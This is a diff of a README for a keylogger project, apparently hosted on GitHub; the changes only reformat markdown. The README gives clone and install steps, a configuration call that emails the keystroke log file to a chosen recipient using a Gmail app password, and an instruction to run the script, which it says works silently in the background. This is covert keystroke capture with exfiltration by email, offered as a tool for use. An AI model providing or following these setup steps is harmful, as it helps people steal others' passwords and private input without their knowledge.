@@ -41,7 +41,8 @@
   pip (Python package manager)
 
 # 🛠️ Installation
-   Clone the repository
+```
+# Clone the repository
    git clone https://github.com/lakshya-004/Keylogger.git  
 
 # Navigate into the project folder
@@ -49,35 +50,30 @@
 
 # Install dependencies
    pip install keyboard
+```
 
-📝 Configuration
+# 📝 Configuration
 
    Before running the script, update your email settings inside Main.py:
-
-   send_email_with_attachment(
-
+```
+send_email_with_attachment(
    sender_email="your_email@gmail.com",
-
    app_password="your_gmail_app_password",
-
    recipient_email="recipient_email@example.com",
-
    subject="Keylogger Log File",
-
    body="Attached is the keylogger log file.",
-
    file_path=log_file_path
-
-   )
-
+)
+```
 
   🔹 Use a Google App Password instead of your Gmail password (required for 2FA accounts).
   🔹 Change time.sleep(60) inside schedule_email() to adjust the email interval (in seconds).
 
 # ▶️ Running the Script
-  python Main.py
+```
+python Main.py
 
-
+```
   The script runs in the background silently. To stop it:
 
   Press Ctrl + C in the terminal, or
